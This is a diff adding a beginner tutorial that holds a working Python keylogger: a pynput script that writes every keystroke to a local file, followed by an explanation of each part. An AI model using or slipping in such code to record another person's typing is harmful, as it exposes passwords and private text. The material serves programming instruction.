@@ -1,0 +1,87 @@
+
+        ____KEYLOGGER___
+
+
+=============
+Instructions:
+=============
+
+Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.
+
+=============
+Python Script:
+=============
+
+
+from pynput import keyboard
+
+# File to save the logs
+log_file = "key_log.txt"
+
+# List to store keystrokes
+keys = []
+
+# Function to write keystrokes to the log file
+def write_to_file(keys):
+    with open(log_file, "a") as f:
+        for key in keys:
+            
+            # Format the key and write it to the file
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+# Callback function for when a key is pressed
+def on_press(key):
+    keys.append(key)
+    write_to_file(keys)
+    keys.clear()
+
+# Callback function for when a key is released
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Start the keylogger
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+=============
+Explanation:
+=============
+
+Imports:
+- ‘from pynput import keyboard’: Imports the necessary modules from the pynput library to handle keyboard events.
+
+Log File:
+- ‘log_file = "key_log.txt”’: Specifies the file where keystrokes will be saved.
+
+Key Storage:
+'keys = []:’ Initializes a list to store keystrokes temporarily.
+
+Write to File:
+- ‘write_to_file(keys): Function to write the captured keystrokes to the log file. It formats the keystrokes and handles special cases (like spaces).
+
+Key Press Callback:
+- on_press(key): Function called whenever a key is pressed. It appends the key to the list and writes it to the file.
+
+Key Release Callback:
+- on_release(key): Function called whenever a key is released. It stops the listener if the Esc key is pressed.
+
+Start the Listener:
+- with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: Starts the keyboard listener to capture keystrokes.
+
+
+
+=============
+ Key Notes::
+=============
+
+1. To install Pynput on terminal initiate --- “pip install pynput”
+
+2. Run the program.
